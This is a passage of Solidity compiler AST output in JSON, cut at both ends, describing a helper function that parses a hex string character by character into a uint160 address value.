												"visibility": "internal"
											}
										],
										"src": "4261:6:0"
									},
									"scope": 1189,
									"src": "4211:89:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 487,
										"nodeType": "Block",
										"src": "4558:857:0",
										"statements": [
											{
												"assignments": [
													320
												],
												"declarations": [
													{
														"constant": false,
														"id": 320,
														"mutability": "mutable",
														"name": "tmp",
														"nameLocation": "4582:3:0",
														"nodeType": "VariableDeclaration",
														"scope": 487,
														"src": "4569:16:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes"
														},
														"typeName": {
															"id": 319,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "4569:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 325,
												"initialValue": {
													"arguments": [
														{
															"id": 323,
															"name": "_a",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 314,
															"src": "4594:2:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 322,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "4588:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_bytes_storage_ptr_$",
															"typeString": "type(bytes storage pointer)"
														},
														"typeName": {
															"id": 321,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "4588:5:0",
															"typeDescriptions": {}
														}
													},
													"id": 324,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4588:9:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_memory_ptr",
														"typeString": "bytes memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "4569:28:0"
											},
											{
												"assignments": [
													327
												],
												"declarations": [
													{
														"constant": false,
														"id": 327,
														"mutability": "mutable",
														"name": "iaddr",
														"nameLocation": "4616:5:0",
														"nodeType": "VariableDeclaration",
														"scope": 487,
														"src": "4608:13:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint160",
															"typeString": "uint160"
														},
														"typeName": {
															"id": 326,
															"name": "uint160",
															"nodeType": "ElementaryTypeName",
															"src": "4608:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint160",
																"typeString": "uint160"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 329,
												"initialValue": {
													"hexValue": "30",
													"id": 328,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "4624:1:0",
													"typeDescriptions": {
														"typeIdentifier": "t_rational_0_by_1",
														"typeString": "int_const 0"
													},
													"value": "0"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "4608:17:0"
											},
											{
												"assignments": [
													331
												],
												"declarations": [
													{
														"constant": false,
														"id": 331,
														"mutability": "mutable",
														"name": "b1",
														"nameLocation": "4644:2:0",
														"nodeType": "VariableDeclaration",
														"scope": 487,
														"src": "4636:10:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint160",
															"typeString": "uint160"
														},
														"typeName": {
															"id": 330,
															"name": "uint160",
															"nodeType": "ElementaryTypeName",
															"src": "4636:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint160",
																"typeString": "uint160"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 332,
												"nodeType": "VariableDeclarationStatement",
												"src": "4636:10:0"
											},
											{
												"assignments": [
													334
												],
												"declarations": [
													{
														"constant": false,
														"id": 334,
														"mutability": "mutable",
														"name": "b2",
														"nameLocation": "4665:2:0",
														"nodeType": "VariableDeclaration",
														"scope": 487,
														"src": "4657:10:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint160",
															"typeString": "uint160"
														},
														"typeName": {
															"id": 333,
															"name": "uint160",
															"nodeType": "ElementaryTypeName",
															"src": "4657:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint160",
																"typeString": "uint160"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 335,
												"nodeType": "VariableDeclarationStatement",
												"src": "4657:10:0"
											},
											{
												"body": {
													"id": 480,
													"nodeType": "Block",
													"src": "4719:657:0",
													"statements": [
														{
															"expression": {
																"id": 353,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"id": 351,
																	"name": "iaddr",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 327,
																	"src": "4734:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"nodeType": "Assignment",
																"operator": "*=",
																"rightHandSide": {
																	"hexValue": "323536",
																	"id": 352,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "4743:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_256_by_1",
																		"typeString": "int_const 256"
																	},
																	"value": "256"
																},
																"src": "4734:12:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint160",
																	"typeString": "uint160"
																}
															},
															"id": 354,
															"nodeType": "ExpressionStatement",
															"src": "4734:12:0"
														},
														{
															"expression": {
																"id": 365,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"id": 355,
																	"name": "b1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 331,
																	"src": "4761:2:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"arguments": [
																		{
																			"arguments": [
																				{
																					"baseExpression": {
																						"id": 360,
																						"name": "tmp",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 320,
																						"src": "4780:3:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_bytes_memory_ptr",
																							"typeString": "bytes memory"
																						}
																					},
																					"id": 362,
																					"indexExpression": {
																						"id": 361,
																						"name": "i",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 337,
																						"src": "4784:1:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"isConstant": false,
																					"isLValue": true,
																					"isPure": false,
																					"lValueRequested": false,
																					"nodeType": "IndexAccess",
																					"src": "4780:6:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes1",
																						"typeString": "bytes1"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_bytes1",
																						"typeString": "bytes1"
																					}
																				],
																				"id": 359,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "4774:5:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_uint8_$",
																					"typeString": "type(uint8)"
																				},
																				"typeName": {
																					"id": 358,
																					"name": "uint8",
																					"nodeType": "ElementaryTypeName",
																					"src": "4774:5:0",
																					"typeDescriptions": {}
																				}
																			},
																			"id": 363,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"nameLocations": [],
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "4774:13:0",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		],
																		"id": 357,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "4766:7:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_uint160_$",
																			"typeString": "type(uint160)"
																		},
																		"typeName": {
																			"id": 356,
																			"name": "uint160",
																			"nodeType": "ElementaryTypeName",
																			"src": "4766:7:0",
																			"typeDescriptions": {}
																		}
																	},
																	"id": 364,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"nameLocations": [],
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "4766:22:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"src": "4761:27:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint160",
																	"typeString": "uint160"
																}
															},
															"id": 366,
															"nodeType": "ExpressionStatement",
															"src": "4761:27:0"
														},
														{
															"expression": {
																"id": 379,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"id": 367,
																	"name": "b2",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 334,
																	"src": "4803:2:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"arguments": [
																		{
																			"arguments": [
																				{
																					"baseExpression": {
																						"id": 372,
																						"name": "tmp",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 320,
																						"src": "4822:3:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_bytes_memory_ptr",
																							"typeString": "bytes memory"
																						}
																					},
																					"id": 376,
																					"indexExpression": {
																						"commonType": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						},
																						"id": 375,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"id": 373,
																							"name": "i",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 337,
																							"src": "4826:1:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "+",
																						"rightExpression": {
																							"hexValue": "31",
																							"id": 374,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "number",
																							"lValueRequested": false,
																							"nodeType": "Literal",
																							"src": "4830:1:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_rational_1_by_1",
																								"typeString": "int_const 1"
																							},
																							"value": "1"
																						},
																						"src": "4826:5:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"isConstant": false,
																					"isLValue": true,
																					"isPure": false,
																					"lValueRequested": false,
																					"nodeType": "IndexAccess",
																					"src": "4822:10:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes1",
																						"typeString": "bytes1"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_bytes1",
																						"typeString": "bytes1"
																					}
																				],
																				"id": 371,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "4816:5:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_uint8_$",
																					"typeString": "type(uint8)"
																				},
																				"typeName": {
																					"id": 370,
																					"name": "uint8",
																					"nodeType": "ElementaryTypeName",
																					"src": "4816:5:0",
																					"typeDescriptions": {}
																				}
																			},
																			"id": 377,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"nameLocations": [],
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "4816:17:0",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		],
																		"id": 369,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "4808:7:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_uint160_$",
																			"typeString": "type(uint160)"
																		},
																		"typeName": {
																			"id": 368,
																			"name": "uint160",
																			"nodeType": "ElementaryTypeName",
																			"src": "4808:7:0",
																			"typeDescriptions": {}
																		}
																	},
																	"id": 378,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"nameLocations": [],
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "4808:26:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"src": "4803:31:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint160",
																	"typeString": "uint160"
																}
															},
															"id": 380,
															"nodeType": "ExpressionStatement",
															"src": "4803:31:0"
														},
														{
															"condition": {
																"commonType": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"id": 389,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"components": [
																		{
																			"commonType": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			},
																			"id": 383,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"id": 381,
																				"name": "b1",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 331,
																				"src": "4854:2:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": ">=",
																			"rightExpression": {
																				"hexValue": "3937",
																				"id": 382,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "4860:2:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_97_by_1",
																					"typeString": "int_const 97"
																				},
																				"value": "97"
																			},
																			"src": "4854:8:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		}
																	],
																	"id": 384,
																	"isConstant": false,
																	"isInlineArray": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "TupleExpression",
																	"src": "4853:10:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "&&",
																"rightExpression": {
																	"components": [
																		{
																			"commonType": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			},
																			"id": 387,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"id": 385,
																				"name": "b1",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 331,
																				"src": "4868:2:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "<=",
																			"rightExpression": {
																				"hexValue": "313032",
																				"id": 386,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "4874:3:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_102_by_1",
																					"typeString": "int_const 102"
																				},
																				"value": "102"
																			},
																			"src": "4868:9:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		}
																	],
																	"id": 388,
																	"isConstant": false,
																	"isInlineArray": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "TupleExpression",
																	"src": "4867:11:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"src": "4853:25:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": {
																"condition": {
																	"commonType": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	"id": 403,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"components": [
																			{
																				"commonType": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				},
																				"id": 397,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"id": 395,
																					"name": "b1",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 331,
																					"src": "4934:2:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": ">=",
																				"rightExpression": {
																					"hexValue": "3635",
																					"id": 396,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "4940:2:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_65_by_1",
																						"typeString": "int_const 65"
																					},
																					"value": "65"
																				},
																				"src": "4934:8:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bool",
																					"typeString": "bool"
																				}
																			}
																		],
																		"id": 398,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "4933:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "&&",
																	"rightExpression": {
																		"components": [
																			{
																				"commonType": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				},
																				"id": 401,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"id": 399,
																					"name": "b1",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 331,
																					"src": "4948:2:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "<=",
																				"rightExpression": {
																					"hexValue": "3730",
																					"id": 400,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "4954:2:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_70_by_1",
																						"typeString": "int_const 70"
																					},
																					"value": "70"
																				},
																				"src": "4948:8:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bool",
																					"typeString": "bool"
																				}
																			}
																		],
																		"id": 402,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "4947:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"src": "4933:24:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"falseBody": {
																	"condition": {
																		"commonType": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		},
																		"id": 417,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"components": [
																				{
																					"commonType": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					},
																					"id": 411,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftExpression": {
																						"id": 409,
																						"name": "b1",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 331,
																						"src": "5013:2:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint160",
																							"typeString": "uint160"
																						}
																					},
																					"nodeType": "BinaryOperation",
																					"operator": ">=",
																					"rightExpression": {
																						"hexValue": "3438",
																						"id": 410,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "5019:2:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_48_by_1",
																							"typeString": "int_const 48"
																						},
																						"value": "48"
																					},
																					"src": "5013:8:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bool",
																						"typeString": "bool"
																					}
																				}
																			],
																			"id": 412,
																			"isConstant": false,
																			"isInlineArray": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"nodeType": "TupleExpression",
																			"src": "5012:10:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "&&",
																		"rightExpression": {
																			"components": [
																				{
																					"commonType": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					},
																					"id": 415,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftExpression": {
																						"id": 413,
																						"name": "b1",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 331,
																						"src": "5027:2:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint160",
																							"typeString": "uint160"
																						}
																					},
																					"nodeType": "BinaryOperation",
																					"operator": "<=",
																					"rightExpression": {
																						"hexValue": "3537",
																						"id": 414,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "5033:2:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_57_by_1",
																							"typeString": "int_const 57"
																						},
																						"value": "57"
																					},
																					"src": "5027:8:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bool",
																						"typeString": "bool"
																					}
																				}
																			],
																			"id": 416,
																			"isConstant": false,
																			"isInlineArray": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"nodeType": "TupleExpression",
																			"src": "5026:10:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"src": "5012:24:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"id": 423,
																	"nodeType": "IfStatement",
																	"src": "5008:73:0",
																	"trueBody": {
																		"id": 422,
																		"nodeType": "Block",
																		"src": "5038:43:0",
																		"statements": [
																			{
																				"expression": {
																					"id": 420,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftHandSide": {
																						"id": 418,
																						"name": "b1",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 331,
																						"src": "5057:2:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint160",
																							"typeString": "uint160"
																						}
																					},
																					"nodeType": "Assignment",
																					"operator": "-=",
																					"rightHandSide": {
																						"hexValue": "3438",
																						"id": 419,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "5063:2:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_48_by_1",
																							"typeString": "int_const 48"
																						},
																						"value": "48"
																					},
																					"src": "5057:8:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"id": 421,
																				"nodeType": "ExpressionStatement",
																				"src": "5057:8:0"
																			}
																		]
																	}
																},
																"id": 424,
																"nodeType": "IfStatement",
																"src": "4929:152:0",
																"trueBody": {
																	"id": 408,
																	"nodeType": "Block",
																	"src": "4959:43:0",
																	"statements": [
																		{
																			"expression": {
																				"id": 406,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftHandSide": {
																					"id": 404,
																					"name": "b1",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 331,
																					"src": "4978:2:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "Assignment",
																				"operator": "-=",
																				"rightHandSide": {
																					"hexValue": "3535",
																					"id": 405,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "4984:2:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_55_by_1",
																						"typeString": "int_const 55"
																					},
																					"value": "55"
																				},
																				"src": "4978:8:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"id": 407,
																			"nodeType": "ExpressionStatement",
																			"src": "4978:8:0"
																		}
																	]
																}
															},
															"id": 425,
															"nodeType": "IfStatement",
															"src": "4849:232:0",
															"trueBody": {
																"id": 394,
																"nodeType": "Block",
																"src": "4880:43:0",
																"statements": [
																	{
																		"expression": {
																			"id": 392,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftHandSide": {
																				"id": 390,
																				"name": "b1",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 331,
																				"src": "4899:2:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "Assignment",
																			"operator": "-=",
																			"rightHandSide": {
																				"hexValue": "3837",
																				"id": 391,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "4905:2:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_87_by_1",
																					"typeString": "int_const 87"
																				},
																				"value": "87"
																			},
																			"src": "4899:8:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			}
																		},
																		"id": 393,
																		"nodeType": "ExpressionStatement",
																		"src": "4899:8:0"
																	}
																]
															}
														},
														{
															"condition": {
																"commonType": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"id": 434,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"components": [
																		{
																			"commonType": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			},
																			"id": 428,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"id": 426,
																				"name": "b2",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 334,
																				"src": "5100:2:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": ">=",
																			"rightExpression": {
																				"hexValue": "3937",
																				"id": 427,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "5106:2:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_97_by_1",
																					"typeString": "int_const 97"
																				},
																				"value": "97"
																			},
																			"src": "5100:8:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		}
																	],
																	"id": 429,
																	"isConstant": false,
																	"isInlineArray": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "TupleExpression",
																	"src": "5099:10:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "&&",
																"rightExpression": {
																	"components": [
																		{
																			"commonType": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			},
																			"id": 432,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"id": 430,
																				"name": "b2",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 334,
																				"src": "5114:2:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "<=",
																			"rightExpression": {
																				"hexValue": "313032",
																				"id": 431,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "5120:3:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_102_by_1",
																					"typeString": "int_const 102"
																				},
																				"value": "102"
																			},
																			"src": "5114:9:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		}
																	],
																	"id": 433,
																	"isConstant": false,
																	"isInlineArray": false,
																	"isLValue": false,
																	"isPure": false,
